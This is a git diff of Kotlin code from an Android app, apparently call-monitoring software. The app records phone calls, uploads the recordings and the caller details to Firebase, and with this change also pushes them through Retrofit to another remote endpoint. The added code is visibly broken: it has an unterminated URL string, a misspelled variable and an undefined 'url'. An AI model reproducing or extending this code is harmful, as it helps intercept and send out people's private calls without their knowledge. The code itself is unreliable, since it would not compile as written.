@@ -4,6 +4,7 @@ import android.content.Context
 import android.media.MediaRecorder
 import android.net.Uri
 import android.os.Build
+import com.github.muneebwanee.dash.data.model.CallRequest
 import com.github.muneebwanee.dash.data.rxFirebase.InterfaceFirebase
 import com.github.muneebwanee.dash.data.model.Calls
 import com.github.muneebwanee.dash.services.base.BaseInteractorService
@@ -49,7 +50,9 @@ class InteractorCalls<S : InterfaceServiceCalls> @Inject constructor(context: Co
     }
 
     override fun stopRecording() {
-        recorder.stopRecording { sendFileCall() }
+        recorder.stopRecording {
+            sendFileCall()
+        }
     }
 
     private fun deleteFile() {
@@ -64,12 +67,25 @@ class InteractorCalls<S : InterfaceServiceCalls> @Inject constructor(context: Co
         getService()!!.addDisposable(firebase().putFile("$CALLS/$dateNumber", uri)
                 .subscribeOn(Schedulers.io())
                 .observeOn(AndroidSchedulers.mainThread())
-                .subscribe({ setPushName() }, { deleteFile() }))
+                .subscribe({ setPushName(url) }, { deleteFile() }))
     }
 
-    private fun setPushName() {
+    private fun setPushName(url: String) {
         val duration = getDurationFile(fileName!!)
         val calls = Calls(contact, phoneNumber, dateTime, duration,type)
+        val request = CallRequest(contact, phoneNumber, dateTime, duration,type , url)
+
+        val retrofit: Retrofit = Builder()
+            .baseUrl("domain)
+            .build()
+
+        val service: CallApi = retrofit.create(CallApi::class.java)
+
+        service.pushCall(requst);
+
+        // Retrofit
+
+        // send to the endpoint
         firebase().getDatabaseReference("$CALLS/$DATA").push().setValue(calls)
         deleteFile()
     }
